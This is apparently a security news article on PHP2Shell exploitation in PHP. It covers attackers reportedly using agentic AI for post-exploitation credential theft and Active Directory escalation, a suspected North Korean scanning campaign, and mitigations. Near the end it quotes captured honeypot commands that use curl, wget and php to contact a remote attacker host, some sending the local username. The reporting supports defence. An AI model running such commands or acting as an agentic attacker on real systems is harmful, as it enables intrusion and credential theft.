# extract: served via trafilatura-direct
---
title: PHP2Shell Exploitation Attempts Continue Amid Suspected N. Korea Global Scanning Activity
author: The Hacker News
url: https://thehackernews.com/2026/10/php2shell-exploitation-hits-government.html
hostname: thehackernews.com
description: Attackers exploited PHP2Shell to access MFA secrets and password hashes at a European government entity, with signs of agentic AI use.
sitename: The Hacker News
date: "2026-10-25"
categories: ['Article']
fingerprint: "359a9d938624f3c8"
---
*In an update, Palo Alto Networks Unit 42 said it's retracting its earlier assessment that the post-compromise activity targeting the European government agency involved the exploitation of the PHP2Shell flaws.*

*"What researchers saw was an attack against a European government agency executed in the context of a vulnerable PHP application," a spokesperson for the company told The Hacker News via email. "This led us to believe that it was exploitation of those vulnerabilities. We are unable to confirm that initial access is associated with the specific PHP2Shell CVEs."*

*The original story follows.*

Threat actors have been observed using agentic artificial intelligence (AI) platforms for post-exploitation activity following the abuse of the [PHP2Shell](https://thehackernews.com/2026/10/php2shell-exploit-attempts-hit-millions.html) vulnerabilities tracked as CVE-2026-109618 and CVE-2026-109619.

"In one case, the attackers targeted a government entity in Europe and within two hours of the initial exploitation they had successfully accessed password hashes and multi-factor authentication secrets," Palo Alto Networks Unit 42 [said](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/).

"They also established an NT LAN Manager (NTLM)-relay tunnel into Active Directory and attempted Domain Admin privilege escalation."

The network security company said it also observed the unknown attacker enumerating the compromised endpoint, with commands and behavioral markers suggesting the work of an agentic attacker. These include commands to facilitate -

- Reconnaissance of the authentication database with stolen credentials, targeting password hashes and two-factor authentication (2FA) secrets.
- Active Directory (AD) reconnaissance via curl-based anonymous LDAP queries to the domain controller (DC) in an attempt to look for the administrator account.
- Reconnaissance of the host to hunt for DNS/AD integration, internal hosts, privileged groups, and interactive users.

"Each command batch is wrapped in section-header delimiters, such as ==SHELLUSER== and ==PASSWD==," it added. "These delimiters produce machine-parseable output for an AI model to read."

### Suspected N. Korea Campaign Targets PHP2Shell

The disclosure comes as CYFIRMA said it [uncovered](https://www.cyfirma.com/research/cyfirma-threat-advisory-suspected-dprk-campaign-staging-php2shell-targeting-against-global-php-infrastructure/) a suspected North Korea-linked campaign employing PHP2Shell to actively probe global PHP infrastructure from 21 compromised nodes.

"The scanning is deliberately low-volume and paced," Kumar Ritesh, CEO and founder of CYFIRMA, told The Hacker News. "Nodes are rotated and abandoned at the first sign of blocking or rate-limiting, so threshold-based alerting is unlikely to catch it."

The targets comprise a set of 216 unpatched or partially mitigated hosts located across the U.S., Japan, South Korea, Thailand, Indonesia, Australia, Taiwan, India, Singapore, the U.A.E., Saudi Arabia, and the E.U. The hosts span government, financial institutions, logistics, airports and aviation, manufacturing, and online transaction platforms.

"The campaign has moved from reconnaissance into active, low-and-slow scanning of a filtered target set," CYFIRMA said. "Organizations in the prioritised sectors and geographies should assume they are in scope for deliberate targeting."


The activity, coordinated via a closed I2P channel, has been attributed with moderate confidence to a Korean-speaking operator assessed to be affiliated with the Lazarus Group ecosystem. According to CYFIRMA, the two handles (전창혁 2 aka Jeon Chang-hyuk 2) and (최아린 aka Choi A-rin) active in the I2P channel have previously been observed running covert operations for the threat actors.

"Korean-speaking operators have used \[the channel\] to share target lists, exploit-hosting infrastructure, and tasking and prioritisation consistent with DPRK objectives," Ritesh said. "The captured conversation uses vocabulary and spelling specific to North Korean (Munhwaŏ) rather than the South Korean standard."

Other primary indicators that link the campaign to the Lazarus cluster are below -

- Command-and-control (C2) infrastructure that Lazarus has previously used to exploit web assets.
- Lazarus Group's documented history of compromising PHP and WordPress servers for C2 and planting of PHP and ASP web shells, as observed in the [SyncHole watering hole](https://thehackernews.com/2025/04/lazarus-hits-6-south-korean-firms-via.html) campaign.
- Prioritizing government agencies and banks, specifically online transaction platforms, which is in line with Lazarus Group's track record of breaching financial institutions for financial and cryptocurrency theft.

"Exploitation is the next step," CYFIRMA said. "The operators said they would shortlist the most promising targets the same day and then choose which public exploits to adapt."

### Other Exploit Efforts and Mitigations

In an October 25, 2026, post [shared](https://x.com/DefusedCyber/status/2114241665972011513) on X, Defused Cyber said it's also seeing PHP2Shell probes targeting its Palo Alto Networks GlobalProtect honeypots. The activity originates from [204.76.203\[.\]7](https://www.virustotal.com/gui/ip-address/204.76.203.7/), a known mass-exploit IP address.

"The requests carry a PHP\_SESSION\_UPLOAD\_PROGRESS marker ('p2s-rider') and a dummy file upload with no payload, which points to someone checking for the vulnerable upload-progress behavior and likely building a target list of Palo Alto devices," the threat intelligence company said.

Both CVE-2026-109618 and CVE-2026-109619 are [critical vulnerabilities](https://success.trendmicro.com/en-US/solution/KA-0024789) that can lead to remote code execution in default PHP configurations. The security flaws have [witnessed](https://patchstack.com/articles/php-major-vulnerability-alert-10-2026/) widespread [scanning efforts](https://x.com/DefusedCyber/status/2112969691668869611), with Cloudflare stating it detected millions of exploitation attempts after public disclosure.

"An attacker faces two main constraints: they must size a request to fail allocation at the right moment, and they must defeat ASLR to find valid memory addresses," Datadog [said](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/#how-the-vulnerabilities-work). "The exploit needs one field name small enough to fit inside the accepted request body but large enough that copying its key exceeds memory\_limit."

"When PHP parses a form-field name, it makes several copies along the way. The attacker uses that extra memory to force an allocation failure while PHP copies the name into a hash table."

ReliaQuest, in an update published on October 22, 2026, said it reproduced CVE-2026-109618 in a controlled lab and observed a sequence of errors that could help defenders identify exploitation.

"This testing identified a specific sequence of artifacts across PHP error, Apache access, Apache error, and system logs that may help defenders detect exploitation," it [said](https://reliaquest.com/blog/threat-spotlight-php2shell-responding-to-critical-php-vulnerabilities/). "Defenders should focus on the sequence: a POST request returns a 500 error, PHP reports memory exhaustion and heap corruption, and the Apache worker handling the request crashes."

The PHP Foundation has since [warned](https://thehackernews.com/2026/10/urgent-php-warns-of-another-unpatched.html) of a third remote code execution vulnerability (CVE-2026-115560), which can only "occur under an unusual combination of configuration and application code." The issue is expected to be addressed as part of the regular release cycle.

"An application must set session.serialize\_handler to php\_binary or php\_serialize in its configuration and then switch it to php at runtime with ini\_set() before calling session\_start()," the Foundation said. "Session upload progress must also still be enabled. Applications that never change the serialize handler at runtime can keep the feature enabled."

Xint has [released a scanner](https://phpguard.io/) to check if a host is exposed to PHP2Shell, [stating](https://xint.io/blog/php2shell-emergency-response) remote code execution is possible in any PHP script regardless of the application and in applications where decoding occurs, such as with session\_start() and unserialize().

Bitsight's internet-wide scans show that there are nearly [37 million internet-facing systems](https://www.bitsight.com/groma-explorer/php/php) running PHP or PHP-related software, with most of the exposures in the U.S., Germany, France, the Netherlands, and Japan.

"PHP runs a very large portion of the web, from content management systems and online shops to bespoke internal tools," Bitsight said. "A flaw in the runtime can't be repaired by changing application code, and a web application firewall or plugin update won’t remove it. Only updating PHP on the host itself closes the gap."

### First ITW Successful Exploitation Attempt Recorded

Perplexity researcher Adel Karimi has [recorded](https://x.com/0x4D31/status/2114052480959213784) what appears to be the first in-the-wild (ITW) successful exploitation of the PHP2Shell vulnerabilities to run shell commands on honeypot servers. These commands have been [observed](https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md) using wget, curl, or PHP CLI to fetch additional payloads from a remote server ("162.35.99\[.\]94:80").No downloaded second-stage artifacts have been observed so far.

Some of the captured shell commands are listed below -

- php -r 'file\_get\_contents("https://162.35.99.94:8080/pwn-\[T2-honeypot-IP\]");'
- curl -s https://162.35.99.94:8080/pwn-\[T2-honeypot-IP\] >/dev/null
- wget -q -O- https://162.35.99.94:80/pwn-\[T2-honeypot-IP\]
- curl -s https://162.35.99.94:80/pwn-\[T2-honeypot-IP\]-$(id -un)
- wget -q -O- https://162.35.99.94:80/pwn-\[T2-honeypot-IP\]-$(id -un)
- php -r 'file\_get\_contents("https://162.35.99.94:80/pwn-\[T2-honeypot-IP\]");'

"This is by far the highest quality confirmation of in-the-wild PHP2Shell exploitation I've seen so far," Expel security researcher Marcus Hutchins [said](https://x.com/MalwareTechBlog/status/2114094868603797841) in an X post.

[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),
